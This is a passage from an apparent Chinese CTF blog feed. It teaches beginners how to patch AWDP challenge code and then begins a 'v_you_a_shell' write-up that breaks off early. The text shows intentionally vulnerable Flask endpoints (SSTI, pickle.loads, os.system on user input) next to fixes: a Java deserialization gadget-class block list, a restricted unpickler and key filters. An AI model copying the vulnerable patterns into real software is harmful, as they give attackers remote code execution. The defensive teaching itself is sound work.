class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> ObjectStreamClass <span class="title function_">readClassDescriptor</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="built_in">super</span>.readClassDescriptor();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">         <span class="keyword">if</span> (readDesc.getName().contains((CharSequence)blackList.get(i))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> readDesc;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      blackList.add(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.syndication.feed.impl.ToStringBean&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Apache Commons Collections</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.FactoryTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Apache Commons Beanutils</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Spring Framework</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Sun/Oracle</span></span><br><span class="line">      blackList.add(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.rmi.MarshalledObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Additional dangerous classes</span></span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.PriorityQueue&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.ArrayDeque&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.Hashtable&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.LinkedHashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.TreeMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.zip.ZipFile&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.FileOutputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.FileInputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.ObjectInputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.ObjectOutputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.net.Socket&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.nio.file.Files&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// custom</span></span><br><span class="line">      blackList.add(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.alibaba.fastjson&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;POJONode&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>springboot代码也要改成如下(记得import上面的类)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DataObject <span class="title function_">deserializeBase64</span><span class="params">(<span class="meta">@RequestBody</span> String base64Data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解码 Base64 数据</span></span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(base64Data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化数据，修改序列化器</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data))) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataObject) ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to deserialize object&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="rce-1"><a href="#rce-1" class="headerlink" title="rce"></a>rce</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">var</span>);</span><br><span class="line">java.lang.ProcessBuilder(<span class="string">&quot;xxx&quot;</span>).start();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.UNIXProcess(<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>特殊(反射)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clazz.getDeclaredMethod</span><br><span class="line">method.invoke</span><br></pre></td></tr></table></figure></p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>直接删除</p><h2 id="通用漏洞修复"><a href="#通用漏洞修复" class="headerlink" title="通用漏洞修复"></a>通用漏洞修复</h2><h2 id="java总结"><a href="#java总结" class="headerlink" title="java总结"></a>java总结</h2><p>不嫌麻烦可以用codeql进行扫描<br><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a><br>根据教程即可，但是需要安装codeql，有点麻烦<br>CodeQL的数据库中本质上保存的是与代码相关的AST语法树</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>漏洞代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">ip, port = re.findall(pattern,request.host).pop()</span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form.get(<span class="string">&quot;word&quot;</span>):</span><br><span class="line">word = request.form.get(<span class="string">&quot;word&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> waf(word):</span><br><span class="line">    word = <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">word = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">result = render_template_string(content % (<span class="built_in">str</span>(ip), <span class="built_in">str</span>(port), <span class="built_in">str</span>(word)))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">result = <span class="string">&quot;Hacker&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><br>该代码从post请求中获取传入的值，最后带入到了 <code>render_template_string(content % (str(ip), str(port), str(word)))</code><br>看到最后有个render之类的函数，并且传入的参数可控，就很可能是ssti的漏洞点</p><h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修复代码</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;&#125;&#125;&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;&#123;%&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;%&#125;&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">    word = <span class="string">&quot;Hacker!&quot;</span></span><br></pre></td></tr></table></figure><p>一般来说过滤掉 <code>&#123;&#123;` , `&#125;&#125;</code> , <code>&#123;%` , `%&#125;</code> ,就可以很大程度防止该漏洞。如果遇到可以编码绕过的形式，那也不是小白能做的了。</p><h2 id="反序列化-2"><a href="#反序列化-2" class="headerlink" title="反序列化"></a>反序列化</h2><p>参考文章：<a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/deserialize&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>():</span><br><span class="line">    <span class="comment"># 获取 POST 请求中的 Base64 编码数据</span></span><br><span class="line">    data_base64 = request.get_json().get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data_base64:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No data provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        data_bytes = base64.b64decode(data_base64)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反序列化数据</span></span><br><span class="line">        data = pickle.loads(data_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: data&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>漏洞点是 <code>pickle.loads(data_bytes)</code>，data_bytes同样是从post数据中获取，并且进行了base64解码，最后反序列化（pickle.loads）</p><p><strong>反序列化原理可以参考网上文章或者我给出的文章链接</strong></p><h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>与java的反序列化修复类似，重写pickle<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="comment">#重写了find_class方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/deserialize&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>():</span><br><span class="line">    <span class="comment"># 获取 POST 请求中的 Base64 编码数据</span></span><br><span class="line">    data_base64 = request.get_json().get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data_base64:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No data provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        data_bytes = base64.b64decode(data_base64)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反序列化数据</span></span><br><span class="line">        data = restricted_loads(data_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: data&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p><h2 id="rce-2"><a href="#rce-2" class="headerlink" title="rce"></a>rce</h2><p>危险函数，看到直接删了就行了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system</span><br><span class="line"><span class="built_in">eval</span></span><br><span class="line">os.subprocess</span><br></pre></td></tr></table></figure><br>同样有flask举例<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>():</span><br><span class="line">    <span class="comment"># 从请求中获取参数</span></span><br><span class="line">    command = request.get_json().get(<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No command provided&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        result = os.system(command)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;result&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p><h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>直接删除即可</p><h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>对传入的参数做一层过滤<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">containsPrototypePollution</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span> || key === <span class="string">&#x27;constructor&#x27;</span> || key === <span class="string">&#x27;prototype&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面总结的漏洞只是该语言的冰山一角，只是挑了部分常见简单的来说<br>还有golang，c#的漏洞，但是上面那些语言更常见，就挑这些来说了，实在不知道怎么修复，但是能找到漏洞点，那就删掉</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;awdp&quot;&gt;&lt;a href=&quot;#awdp&quot; class=&quot;headerlink&quot; title=&quot;awdp&quot;&gt;&lt;/a&gt;awdp&lt;/h1&gt;&lt;p&gt;因为本章纯新手向，所以只讲讲防御应该怎么防御&lt;br&gt;awdp介绍&lt;br&gt;一般会给你一个附件让修复里面的漏洞，然后提交修复好的附件进行check，并且提交次数是有限制的，假如是5次，你提交5次都没check过，那你就不允许继续提交了，所以要谨慎修复&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="awdp" scheme="https://kaikaix.github.io/categories/awdp/"/>
    
    
    <category term="ctf" scheme="https://kaikaix.github.io/tags/ctf/"/>
    
    <category term="awdp" scheme="https://kaikaix.github.io/tags/awdp/"/>
    
  </entry>
  
  <entry>
    <title>矩阵杯v_you_a_shell</title>
    <link href="https://kaikaix.github.io/2024/06/02/%E7%9F%A9%E9%98%B5%E6%9D%AFv-you-a-shell/"/>
    <id>https://kaikaix.github.io/2024/06/02/%E7%9F%A9%E9%98%B5%E6%9D%AFv-you-a-shell/</id>
    <published>2024-06-02T06:59:17.000Z</published>
    <updated>2024-06-02T11:47:18.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="v-you-a-shell"><a href="#v-you-a-shell" class="headerlink" title="v_you_a_shell"></a>v_you_a_shell</h1><span id="more"></span><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>首先通过php读取到了两个python服务，<code>/app/app.py</code>,<code>/app/flagService.py</code>，然后通过读取 <code>/start.sh</code>，找到了dbus的配置文件<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 